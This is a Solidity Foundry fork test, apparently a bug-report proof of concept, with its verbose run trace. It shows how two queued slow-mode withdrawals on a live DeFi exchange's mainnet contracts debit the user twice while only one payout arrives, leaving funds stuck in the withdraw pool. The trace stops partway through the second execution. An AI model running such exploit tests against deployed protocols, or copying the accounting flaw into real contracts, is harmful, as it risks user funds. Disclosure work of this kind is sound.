pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {Endpoint} from "../src/contracts/Endpoint.sol";
import {WithdrawPool} from "../src/contracts/WithdrawPool.sol";
import {IClearinghouse} from "../src/contracts/interfaces/clearinghouse/IClearinghouse.sol";
import {ISpotEngine} from "../src/contracts/interfaces/engine/ISpotEngine.sol";
import {IEndpoint} from "../src/contracts/interfaces/IEndpoint.sol";
import {IERC20Base} from "../src/contracts/interfaces/IERC20Base.sol";
import {
    QUOTE_PRODUCT_ID,
    SLOW_MODE_TX_DELAY
} from "../src/contracts/common/Constants.sol";
contract SlowModeWithdrawExploitForkTest is Test {
    address constant ENDPOINT_PROXY =
        0x05ec92D78ED421f3D3Ada77FFdE167106565974E;
    address constant CLEARINGHOUSE_PROXY =
        0xD218103918C19D0A10cf35300E4CfAfbD444c5fE;
    address constant SPOT_ENGINE_PROXY =
        0xFcD94770B95fd9Cc67143132BB172EB17A0907fE;
    address constant WITHDRAW_POOL_PROXY =
        0x09fb495AA7859635f755E827d64c4C9A2e5b9651;
    Endpoint internal endpoint = Endpoint(ENDPOINT_PROXY);
    IClearinghouse internal clearinghouse =
        IClearinghouse(CLEARINGHOUSE_PROXY);
    ISpotEngine internal spotEngine = ISpotEngine(SPOT_ENGINE_PROXY);
    WithdrawPool internal withdrawPool =
        WithdrawPool(WITHDRAW_POOL_PROXY);
    IERC20Base internal quoteToken;
    address internal user;
    bytes12 constant SUBACCOUNT_NAME = bytes12("SLOWMODETEST");
    bytes32 internal subaccount;
    function setUp() public {
        user = makeAddr("user");
        subaccount = bytes32(abi.encodePacked(user, SUBACCOUNT_NAME));
        address quoteTokenAddr = clearinghouse.getQuote();
        quoteToken = IERC20Base(quoteTokenAddr);
        _drainExistingSlowMode();
        _fundAndDeposit();
    }
    function _drainExistingSlowMode() internal {
        vm.warp(block.timestamp + 365 days);
        (, uint64 txUpTo, uint64 txCount) = endpoint.getSlowModeTx(0);
        while (txUpTo < txCount) {
            endpoint.executeSlowModeTransaction();
            (, txUpTo, txCount) = endpoint.getSlowModeTx(0);
        }
    }
    // give the user real quote tokens on the fork and deposit via slow-mode
    function _fundAndDeposit() internal {
        uint256 slowModeFee = clearinghouse.getSlowModeFee();
        uint8 decimals = quoteToken.decimals();
        uint256 depositAmount = 200 * (10 ** decimals);
        uint256 totalFunds = depositAmount + 10 * slowModeFee;
        deal(address(quoteToken), user, totalFunds);
        vm.startPrank(user);
        quoteToken.approve(address(endpoint), type(uint256).max);
        endpoint.depositCollateral(
            SUBACCOUNT_NAME,
            QUOTE_PRODUCT_ID,
            uint128(depositAmount)
        );
        vm.stopPrank();
        vm.warp(block.timestamp + SLOW_MODE_TX_DELAY + 1);
        endpoint.executeSlowModeTransaction();
        ISpotEngine.Balance memory bal =
            spotEngine.getBalance(QUOTE_PRODUCT_ID, subaccount);
        assertGt(bal.amount, 0, "deposit didn't register");
    }
    function _submitSlowModeWithdraw(uint128 amount, uint64 nonce) internal {
        IEndpoint.WithdrawCollateral memory w =
            IEndpoint.WithdrawCollateral({
                sender: subaccount,
                productId: QUOTE_PRODUCT_ID,
                amount: amount,
                nonce: nonce
            });
        bytes memory txData = abi.encodePacked(
            uint8(IEndpoint.TransactionType.WithdrawCollateral),
            abi.encode(w)
        );
        vm.prank(user);
        endpoint.submitSlowModeTransaction(txData);
    }
    function test_slowModeWithdraw_eats_second_withdraw() public {
        uint8 decimals = quoteToken.decimals();
        uint128 withdrawAmount =
            uint128(50 * (10 ** decimals)); // 50 units
        _submitSlowModeWithdraw(withdrawAmount, 1);
        _submitSlowModeWithdraw(withdrawAmount, 2);
        uint64 idx = endpoint.nSubmissions();
        int128 internalBefore =
            spotEngine.getBalance(QUOTE_PRODUCT_ID, subaccount).amount;
        uint256 walletBefore = quoteToken.balanceOf(user);
        uint256 poolBefore =
            quoteToken.balanceOf(address(withdrawPool));
        bool markedBefore = withdrawPool.markedIdxs(idx);
        assertFalse(markedBefore, "idx should be unused before execution");
        vm.warp(block.timestamp + SLOW_MODE_TX_DELAY + 1);
        endpoint.executeSlowModeTransaction();
        int128 internalAfterFirst =
            spotEngine.getBalance(QUOTE_PRODUCT_ID, subaccount).amount;
        uint256 walletAfterFirst = quoteToken.balanceOf(user);
        uint256 poolAfterFirst =
            quoteToken.balanceOf(address(withdrawPool));
        bool markedAfterFirst = withdrawPool.markedIdxs(idx);
        assertTrue(markedAfterFirst, "idx should be marked after first withdraw");
        endpoint.executeSlowModeTransaction();
        int128 internalAfterSecond =
            spotEngine.getBalance(QUOTE_PRODUCT_ID, subaccount).amount;
        uint256 walletAfterSecond = quoteToken.balanceOf(user);
        uint256 poolAfterSecond =
            quoteToken.balanceOf(address(withdrawPool));
        bool markedAfterSecond = withdrawPool.markedIdxs(idx);
        assertTrue(markedAfterSecond, "idx remains marked after second withdraw");
        int256 delta1 =
            int256(internalBefore) - int256(internalAfterFirst);
        int256 delta2 =
            int256(internalAfterFirst) - int256(internalAfterSecond);
        assertGt(delta1, 0, "internal should drop on first withdraw");
        assertGt(delta2, 0, "internal should drop on second withdraw");
        assertEq(
            uint256(delta1),
            uint256(delta2),
            "each slow-mode withdraw charges same internal amount"
        );
        assertEq(
            walletAfterFirst - walletBefore,
            uint256(withdrawAmount),
            "first withdraw should credit user"
        );
        assertEq(
            walletAfterSecond,
            walletAfterFirst,
            "second withdraw should NOT credit user again"
        );
        assertEq(
            poolAfterFirst - poolBefore,
            0,
            "pool balance should be unchanged after first withdraw"
        );
        assertEq(
            poolAfterSecond - poolBefore,
            uint256(withdrawAmount),
            "pool must retain 1x withdraw amount (stuck funds)"
        );
    }
}







root@Gandhi:/home/gajnithehero/nado# forge test   --fork-url https://rpc-gel.inkonchain.com   -vvvv   --match-test test_slowModeWithdraw_eats_second_withdraw --via-ir
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.30
[⠔] Solc 0.8.30 finished in 2.25s
Compiler run successful!

Ran 1 test for test/test.sol:SlowModeWithdrawExploitForkTest
[PASS] test_slowModeWithdraw_eats_second_withdraw() (gas: 629792)
Traces:
  [792506] SlowModeWithdrawExploitForkTest::test_slowModeWithdraw_eats_second_withdraw()
    ├─ [9514] 0x0200C29006150606B650577BBE7B6248F58470c1::decimals() [staticcall]
    │   ├─ [2357] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ [0] VM::prank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D])
    │   └─ ← [Return]
    ├─ [248628] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::submitSlowModeTransaction(0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000001)
    │   ├─ [241438] 0x34D3369421070e52EB881527eD23A934486427Dc::submitSlowModeTransaction(0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   ├─ [9758] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getToken(0) [staticcall]
    │   │   │   ├─ [2598] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getToken(0) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0200C29006150606B650577BBE7B6248F58470c1
    │   │   │   └─ ← [Return] 0x0200C29006150606B650577BBE7B6248F58470c1
    │   │   ├─ [21045] 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE::getSlowModeFee() [staticcall]
    │   │   │   ├─ [13888] 0x253cEe58633AF8AAB5e64669Ef197fB7742F9ba7::getSlowModeFee() [delegatecall]
    │   │   │   │   ├─ [8340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   ├─ [7650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   ├─ [1014] 0x0200C29006150606B650577BBE7B6248F58470c1::decimals() [staticcall]
    │   │   │   │   │   ├─ [357] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::decimals() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   └─ ← [Return] 1000000 [1e6]
    │   │   │   └─ ← [Return] 1000000 [1e6]
    │   │   ├─ [25278] 0x0200C29006150606B650577BBE7B6248F58470c1::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, 1000000 [1e6])
    │   │   │   ├─ [24609] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, 1000000 [1e6]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], to: 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, value: 1000000 [1e6])
    │   │   │   │   ├─ emit Approval(owner: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], spender: 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, value: 115792089237316195423570985008687907853269984665640564039457584007912928639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [280] 0xdb6F1aA2646965B62dAD274719eadB4B33cd3e2B::isSanctioned(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] VM::prank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D])
    │   └─ ← [Return]
    ├─ [177628] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::submitSlowModeTransaction(0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000002)
    │   ├─ [176938] 0x34D3369421070e52EB881527eD23A934486427Dc::submitSlowModeTransaction(0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   ├─ [1258] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getToken(0) [staticcall]
    │   │   │   ├─ [598] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getToken(0) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0200C29006150606B650577BBE7B6248F58470c1
    │   │   │   └─ ← [Return] 0x0200C29006150606B650577BBE7B6248F58470c1
    │   │   ├─ [6545] 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE::getSlowModeFee() [staticcall]
    │   │   │   ├─ [5888] 0x253cEe58633AF8AAB5e64669Ef197fB7742F9ba7::getSlowModeFee() [delegatecall]
    │   │   │   │   ├─ [2340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   ├─ [1650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   ├─ [1014] 0x0200C29006150606B650577BBE7B6248F58470c1::decimals() [staticcall]
    │   │   │   │   │   ├─ [357] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::decimals() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   └─ ← [Return] 1000000 [1e6]
    │   │   │   └─ ← [Return] 1000000 [1e6]
    │   │   ├─ [6878] 0x0200C29006150606B650577BBE7B6248F58470c1::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, 1000000 [1e6])
    │   │   │   ├─ [6209] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, 1000000 [1e6]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], to: 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, value: 1000000 [1e6])
    │   │   │   │   ├─ emit Approval(owner: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], spender: 0x05ec92D78ED421f3D3Ada77FFdE167106565974E, value: 115792089237316195423570985008687907853269984665640564039457584007912927639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [280] 0xdb6F1aA2646965B62dAD274719eadB4B33cd3e2B::isSanctioned(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [3006] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::nSubmissions() [staticcall]
    │   ├─ [2349] 0x34D3369421070e52EB881527eD23A934486427Dc::nSubmissions() [delegatecall]
    │   │   └─ ← [Return] 115035 [1.15e5]
    │   └─ ← [Return] 115035 [1.15e5]
    ├─ [8318] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [staticcall]
    │   ├─ [7655] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [delegatecall]
    │   │   └─ ← [Return] Balance({ amount: 199999999999999999999 [1.999e20] })
    │   └─ ← [Return] Balance({ amount: 199999999999999999999 [1.999e20] })
    ├─ [1240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   ├─ [580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [delegatecall]
    │   │   └─ ← [Return] 8000000 [8e6]
    │   └─ ← [Return] 8000000 [8e6]
    ├─ [3240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [staticcall]
    │   ├─ [2580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [delegatecall]
    │   │   └─ ← [Return] 50010000000 [5.001e10]
    │   └─ ← [Return] 50010000000 [5.001e10]
    ├─ [9702] 0x09fb495AA7859635f755E827d64c4C9A2e5b9651::markedIdxs(115035 [1.15e5]) [staticcall]
    │   ├─ [2542] 0x8A2bfb0BE373Cb16BB2aB579cF0f4183cDCf2e6C::markedIdxs(115035 [1.15e5]) [delegatecall]
    │   │   └─ ← [Return] false
    │   └─ ← [Return] false
    ├─ [0] VM::warp(1795954385 [1.795e9])
    │   └─ ← [Return]
    ├─ [177356] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::executeSlowModeTransaction()
    │   ├─ [176702] 0x34D3369421070e52EB881527eD23A934486427Dc::executeSlowModeTransaction() [delegatecall]
    │   │   ├─ [171007] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::processSlowModeTransaction(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   ├─ [170311] 0x34D3369421070e52EB881527eD23A934486427Dc::processSlowModeTransaction(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   │   ├─ [167758] 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE::withdrawCollateral(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0, 50000000 [5e7], 0x0000000000000000000000000000000000000000, 115035 [1.15e5])
    │   │   │   │   │   ├─ [167080] 0x253cEe58633AF8AAB5e64669Ef197fB7742F9ba7::withdrawCollateral(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0, 50000000 [5e7], 0x0000000000000000000000000000000000000000, 115035 [1.15e5]) [delegatecall]
    │   │   │   │   │   │   ├─ [2340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [1650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   ├─ [13716] 0x0200C29006150606B650577BBE7B6248F58470c1::transfer(0x09fb495AA7859635f755E827d64c4C9A2e5b9651, 50000000 [5e7])
    │   │   │   │   │   │   │   ├─ [13053] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::transfer(0x09fb495AA7859635f755E827d64c4C9A2e5b9651, 50000000 [5e7]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE, to: 0x09fb495AA7859635f755E827d64c4C9A2e5b9651, value: 50000000 [5e7])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [36181] 0x09fb495AA7859635f755E827d64c4C9A2e5b9651::submitWithdrawal(0x0200C29006150606B650577BBE7B6248F58470c1, user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7], 115035 [1.15e5])
    │   │   │   │   │   │   │   ├─ [35509] 0x8A2bfb0BE373Cb16BB2aB579cF0f4183cDCf2e6C::submitWithdrawal(0x0200C29006150606B650577BBE7B6248F58470c1, user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7], 115035 [1.15e5]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [6116] 0x0200C29006150606B650577BBE7B6248F58470c1::transfer(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7])
    │   │   │   │   │   │   │   │   │   ├─ [5453] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::transfer(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x09fb495AA7859635f755E827d64c4C9A2e5b9651, to: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], value: 50000000 [5e7])
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [2340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [1650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   ├─ [1014] 0x0200C29006150606B650577BBE7B6248F58470c1::decimals() [staticcall]
    │   │   │   │   │   │   │   ├─ [357] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::decimals() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   │   ├─ [18556] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::updateBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, -50000000000000000000 [-5e19])
    │   │   │   │   │   │   │   ├─ [17890] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::updateBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, -50000000000000000000 [-5e19]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit SpotBalance(subaccount: 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, productId: 0, amount: 149999999999999999998 [1.499e20], lastCumulativeMultiplierX18: 1000000858388862927 [1e18])
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [5062] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::assertUtilization(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [4405] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::assertUtilization(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [15133] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0)
    │   │   │   │   │   │   │   ├─ [14470] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit PriceQuery(productId: 0)
    │   │   │   │   │   │   │   │   └─ ← [Return] 149999999999999999998 [1.499e20]
    │   │   │   │   │   │   │   └─ ← [Return] 149999999999999999998 [1.499e20]
    │   │   │   │   │   │   ├─ [14822] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0)
    │   │   │   │   │   │   │   ├─ [7659] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [16582] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 2, 0)
    │   │   │   │   │   │   │   ├─ [15907] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 2, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 86406623016887042619877 [8.64e22], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 86406623016887042619877 [8.64e22], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   ├─ [16582] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 4, 0)
    │   │   │   │   │   │   │   ├─ [15907] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 4, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 2818499613537808623490 [2.818e21], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 2818499613537808623490 [2.818e21], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   ├─ emit ModifyCollateral(amount: -50000000000000000000 [-5e19], subaccount: 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, productId: 0)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [2318] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [staticcall]
    │   ├─ [1655] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [delegatecall]
    │   │   └─ ← [Return] Balance({ amount: 149999999999999999998 [1.499e20] })
    │   └─ ← [Return] Balance({ amount: 149999999999999999998 [1.499e20] })
    ├─ [1240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   ├─ [580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [delegatecall]
    │   │   └─ ← [Return] 58000000 [5.8e7]
    │   └─ ← [Return] 58000000 [5.8e7]
    ├─ [1240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [staticcall]
    │   ├─ [580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [delegatecall]
    │   │   └─ ← [Return] 50010000000 [5.001e10]
    │   └─ ← [Return] 50010000000 [5.001e10]
    ├─ [1202] 0x09fb495AA7859635f755E827d64c4C9A2e5b9651::markedIdxs(115035 [1.15e5]) [staticcall]
    │   ├─ [542] 0x8A2bfb0BE373Cb16BB2aB579cF0f4183cDCf2e6C::markedIdxs(115035 [1.15e5]) [delegatecall]
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [75395] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::executeSlowModeTransaction()
    │   ├─ [74741] 0x34D3369421070e52EB881527eD23A934486427Dc::executeSlowModeTransaction() [delegatecall]
